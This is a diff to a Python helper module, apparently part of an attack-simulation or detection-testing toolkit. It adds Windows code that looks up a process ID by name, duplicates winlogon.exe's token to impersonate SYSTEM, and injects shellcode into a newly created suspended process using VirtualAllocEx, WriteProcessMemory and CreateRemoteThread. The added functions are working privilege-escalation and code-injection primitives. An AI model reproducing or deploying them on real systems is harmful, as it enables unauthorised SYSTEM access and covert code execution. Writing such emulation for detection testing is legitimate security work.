@@ -24,6 +24,8 @@ from pathlib import Path
 from typing import Iterable, Optional, Union
 
 
+
+    
 from http.server import HTTPServer, SimpleHTTPRequestHandler
 
 long_t = type(1 << 63)
@@ -67,6 +69,60 @@ else:
 if CURRENT_OS == WINDOWS:
     CMD_PATH = os.environ.get("COMSPEC")
     POWERSHELL_PATH = "C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+    import ctypes
+    import win32process
+    import win32file
+    import win32service
+    import win32api, win32security
+    from ctypes import byref, windll, wintypes
+    from ctypes.wintypes import BOOL
+    from ctypes.wintypes import DWORD
+    from ctypes.wintypes import HANDLE
+    from ctypes.wintypes import LPVOID
+    from ctypes.wintypes import LPCVOID
+    # Windows related constants and classes
+    TH32CS_SNAPPROCESS = 0x00000002
+    PROCESS_QUERY_LIMITED_INFORMATION = 0x1000
+    TOKEN_DUPLICATE = 0x0002
+    TOKEN_ALL_ACCESS = 0xf00ff
+    MAX_PATH = 260
+    BOOL = ctypes.c_int
+    DWORD = ctypes.c_uint32
+    HANDLE = ctypes.c_void_p
+    LONG = ctypes.c_int32
+    NULL_T = ctypes.c_void_p
+    SIZE_T = ctypes.c_uint
+    TCHAR = ctypes.c_char
+    USHORT = ctypes.c_uint16
+    UCHAR = ctypes.c_ubyte
+    ULONG = ctypes.c_uint32
+
+    class PROCESSENTRY32(ctypes.Structure):
+        _fields_ = [
+            ('dwSize', DWORD),
+            ('cntUsage', DWORD),
+            ('th32ProcessID', DWORD),
+            ('th32DefaultHeapID', NULL_T),
+            ('th32ModuleID', DWORD),
+            ('cntThreads', DWORD),
+            ('th32ParentProcessID', DWORD),
+            ('pcPriClassBase', LONG),
+            ('dwFlags', DWORD),
+            ('szExeFile', TCHAR * MAX_PATH)
+        ]
+
+    LPCSTR = LPCTSTR = ctypes.c_char_p
+    LPDWORD = PDWORD = ctypes.POINTER(DWORD)
+
+    class _SECURITY_ATTRIBUTES(ctypes.Structure):
+        _fields_ = [('nLength', DWORD),
+                    ('lpSecurityDescriptor', LPVOID),
+                    ('bInheritHandle', BOOL), ]
+
+    SECURITY_ATTRIBUTES = _SECURITY_ATTRIBUTES
+    LPSECURITY_ATTRIBUTES = ctypes.POINTER(_SECURITY_ATTRIBUTES)
+    LPTHREAD_START_ROUTINE = LPVOID
+
 else:
     CMD_PATH = "/bin/sh"
     POWERSHELL_PATH = None
@@ -669,3 +725,88 @@ def print_file(path):
             print(f.read().rstrip())
 
     print("")
+
+
+# return pid by process.name
+@requires_os('windows')
+def getppid(pname):
+    CreateToolhelp32Snapshot = ctypes.windll.kernel32.CreateToolhelp32Snapshot 
+    Process32First = ctypes.windll.kernel32.Process32First  
+    Process32Next = ctypes.windll.kernel32.Process32Next 
+    CloseHandle = ctypes.windll.kernel32.CloseHandle 
+
+    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0) 
+    pe32 = PROCESSENTRY32() 
+    pe32.dwSize = ctypes.sizeof(PROCESSENTRY32)
+    current_pid = os.getpid()
+
+
+    if Process32First(hProcessSnap, ctypes.byref(pe32)) == 0:
+     print(f"[x] - Failed getting first process.")
+     return
+
+    while True:
+        procname = pe32.szExeFile.decode("utf-8").lower()
+        if pname.lower() in procname:
+            CloseHandle(hProcessSnap)
+            return pe32.th32ProcessID
+        if not Process32Next(hProcessSnap, ctypes.byref(pe32)):
+            CloseHandle(hProcessSnap)
+            return None
+
+@requires_os('windows')
+def impersonate_system(): 
+     try: 
+        hp = win32api.OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, 0, getppid("winlogon.exe"))
+        th = win32security.OpenProcessToken(hp, TOKEN_DUPLICATE)
+        new_tokenh = win32security.DuplicateTokenEx(th, 2, TOKEN_ALL_ACCESS , win32security.TokenImpersonation , win32security.SECURITY_ATTRIBUTES())
+        win32security.ImpersonateLoggedOnUser(new_tokenh)
+        print(f"[+] - Impersonated System Token via Winlogon")
+        win32api.CloseHandle(hp)
+     except Exception as e:
+            print(f"[x] - Failed To Impersonate System Token via Winlogon")
+            
+@requires_os('windows')
+def Inject(path, shellcode):
+    import ctypes, time
+    import ctypes.wintypes
+
+    from ctypes.wintypes import BOOL
+    from ctypes.wintypes import DWORD
+    from ctypes.wintypes import HANDLE
+    from ctypes.wintypes import LPVOID
+    from ctypes.wintypes import LPCVOID
+    import win32process
+    # created suspended process
+    info = win32process.CreateProcess(None, path, None, None, False, 0x04, None, None, win32process.STARTUPINFO())
+    page_rwx_value = 0x40
+    process_all = 0x1F0FFF
+    memcommit = 0x00001000
+
+    if info[0].handle > 0 :
+       print(f"[+] - Created {path} Suspended")
+    shellcode_length = len(shellcode)
+    process_handle = info[0].handle  # phandle
+    VirtualAllocEx = windll.kernel32.VirtualAllocEx
+    VirtualAllocEx.restype = LPVOID
+    VirtualAllocEx.argtypes = (HANDLE, LPVOID, DWORD, DWORD, DWORD)
+
+    WriteProcessMemory = ctypes.windll.kernel32.WriteProcessMemory
+    WriteProcessMemory.restype = BOOL
+    WriteProcessMemory.argtypes = (HANDLE, LPVOID, LPCVOID, DWORD, DWORD)
+    CreateRemoteThread = ctypes.windll.kernel32.CreateRemoteThread
+    CreateRemoteThread.restype = HANDLE
+    CreateRemoteThread.argtypes = (HANDLE, LPSECURITY_ATTRIBUTES, DWORD, LPTHREAD_START_ROUTINE, LPVOID, DWORD, DWORD)
+
+    # allocate RWX memory
+    lpBuffer = VirtualAllocEx(process_handle, 0, shellcode_length, memcommit, page_rwx_value)
+    print(f'[+] - Allocated remote memory at {hex(lpBuffer)}')
+
+    # write shellcode in allocated memory
+    res = WriteProcessMemory(process_handle, lpBuffer, shellcode, shellcode_length, 0)
+    if res > 0 :
+        print('[+] - Shellcode written.')
+
+    # create remote thread to start shellcode execution
+    CreateRemoteThread(process_handle, None, 0, lpBuffer, 0, 0, 0)
+    print('[+] - Shellcode Injection, done.')
